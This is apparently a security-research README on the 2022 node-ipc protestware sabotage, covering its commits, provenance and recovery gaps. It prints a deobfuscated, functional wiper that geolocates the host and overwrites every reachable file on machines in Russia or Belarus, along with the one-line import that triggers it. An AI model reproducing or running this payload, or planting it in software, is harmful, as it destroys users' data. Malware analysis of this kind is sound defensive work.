# Recovered evidence — node-ipc (2022)

**Security research artifact. Do not execute `ssl-geospec.js`.** Unlike the
event-stream and ua-parser-js payloads elsewhere in this dataset (which
depend on dead C2 infrastructure and are inert today), this file's only
external dependency — `api.ipgeolocation.io`, a real, currently-operating
geolocation API — is very plausibly still up. If run on a machine that
geolocates to Russia or Belarus, it recursively overwrites every file it can
reach under `./`, `../`, `../../`, and `/`. Treat it as live, not historical.

## Why this was recoverable

Like colors.js, node-ipc's sabotage was committed by the legitimate
maintainer (RIAEvangelist / Brandon Nozaki Miller) to his own repository —
no account hijack, nothing hidden from git at commit time. The upstream
`RIAEvangelist/node-ipc` repository's history around this period is no
longer reachable via the GitHub API (commits from March 2022 return empty),
consistent with history having been rewritten or force-pushed after the
incident. A full mirror survives at `samuelmattjohnston/node-ipc`
(archived 2022-03-18, tag `v10.1.3` applied by RIAEvangelist himself on
2022-03-08) — this preserves the original, unmodified commit history from
before any cleanup.

## The payload

`services/IPC.js` imports `../dao/ssl-geospec.js` (a new file) and calls it
during connection setup — a single line, easy to miss in review:

```diff
+import ssl from '../dao/ssl-geospec.js';
 ...
     callback(this);
+    return ssl;
```

`ssl-geospec.js` itself (see the file in this directory, verbatim) is
minified/obfuscated with hex-string-free but base64-wrapped literals. Our
own deobfuscation, decoding every `Buffer.from(..., "base64")` literal
in place:

```js
setTimeout(function () {
  // 40% chance of proceeding at all (roll <= 1 out of 0..4) — jitter meant
  // to dodge quick automated/manual smoke checks after `npm install`.
  const roll = Math.round(Math.random() * 4);
  if (roll > 1) return;

  const geoApiUrl = "https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154";

  https.get(geoApiUrl, function (res) {
    res.on("data", function (chunk) {
      try {
        const geo = JSON.parse(chunk.toString("utf8"));
        const country = geo["country_name"].toLowerCase();
        if (country.includes("russia") || country.includes("belarus")) {
          wipe("./");     wipe("../");
          wipe("../../"); wipe("/");
        }
      } catch (e) {}
    });
  });
}, Math.ceil(Math.random() * 1000));

// Recursively walks `dir`; every file gets overwritten (filter="" matches
// every path via `.indexOf("") >= 0`) with a heart emoji.
async function wipe(dir = "", filter = "") {
  if (!fs.existsSync(dir)) return;
  let entries = [];
  try { entries = fs.readdirSync(dir); } catch (e) {}
  for (const name of entries) {
    const entryPath = path.join(dir, name);
    let stat;
    try { stat = fs.lstatSync(entryPath); } catch (e) { continue; }
    if (stat.isDirectory()) {
      wipe(entryPath, filter);
    } else if (entryPath.indexOf(filter) >= 0) {
      try { fs.writeFile(entryPath, "❤️", function () {}); } catch (e) {}
    }
  }
}
```

Base64 string table (decoded from the verbatim file — see
`commit-847047cf7f81-relevant.diff`):

| literal | decodes to |
|---|---|
| `aHR0cHM6...TU0` | `https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154` |
| `Li8=` / `Li4v` / `Li4vLi4v` / `Lw==` | `./` / `../` / `../../` / `/` |
| `Y291bnRyeV9uYW1l` | `country_name` |
| `cnVzc2lh` / `YmVsYXJ1cw==` | `russia` / `belarus` |
| `4p2k77iP` | ❤️ |

## Files

| File | What it is |
|---|---|
| `ssl-geospec.js` | The exact malicious file (`dao/ssl-geospec.js`) as committed, verbatim except for one prepended safety-comment line (see the file's own header). |
| `commit-847047cf7f81-relevant.diff` | The full sabotage commit, excluding an unrelated 4MB of committed `coverage/` HTML report noise from the same commit. Non-coverage files only: `dao/ssl-geospec.js` (new), `services/IPC.js` (+2 lines wiring it in), `package.json`/`package-lock.json` (version bump `10.1.0` → `10.1.1`). |

## Provenance

- Mirror repository: <https://github.com/samuelmattjohnston/node-ipc>
  (fork of `RIAEvangelist/node-ipc`, archived 2022-03-18)
- Sabotage commit: `847047cf7f81ab08352038b2204f0e7633449580`
  (author `RIAEvangelist <brandon@diginow.it>`, 2022-03-07T11:03:26Z,
  message: "added ssl check" — bumps `package.json` to `10.1.1`)
- A same-day follow-up commit, `6e344066a0464814a27fbd7ca8422f473956a803`
  ("bump for ansi-regex module update"), brings `package.json` to `10.1.2`
  via a dependabot-triggered transitive dependency bump only —
  `ssl-geospec.js` itself isn't touched, so `10.1.2`'s payload is presumed
  identical to `10.1.1`'s (not independently re-diffed).
- Fetched directly via GitHub's commit `.diff` endpoint on the mirror.

## What's still not recovered

- `node-ipc@10.1.3` (present in the npm registry's `time` metadata,
  unpublished from `versions{}`) — no corresponding commit identified past
  `6e344066a046`; likely another minor bump, not independently confirmed.
- `node-ipc@9.2.2` / the `peacenotwar` module — a materially different,
  non-destructive payload (drops a `WITH-LOVE-FROM-AMERICA.txt` file rather
  than wiping anything) backported to the `9.x` line. Not present in this
  mirror's history (it only tracks the `10.x` line). Documented only via
  secondary sources — [Snyk's writeup](https://snyk.io/blog/peacenotwar-malicious-npm-node-ipc-package-vulnerability/)
  — not independently recovered here.
- A completely separate, unrelated 2026 node-ipc credential-stealer incident
  (versions `9.1.6`, `9.2.3`, `12.0.1`, different threat actor, financially
  motivated) was surfaced during this research but is out of scope for the
  2022 protestware incident this directory documents — see
  [The Hacker News coverage](https://thehackernews.com/2026/05/stealer-backdoor-found-in-3-node-ipc.html)
  if it becomes a separate dataset entry later.
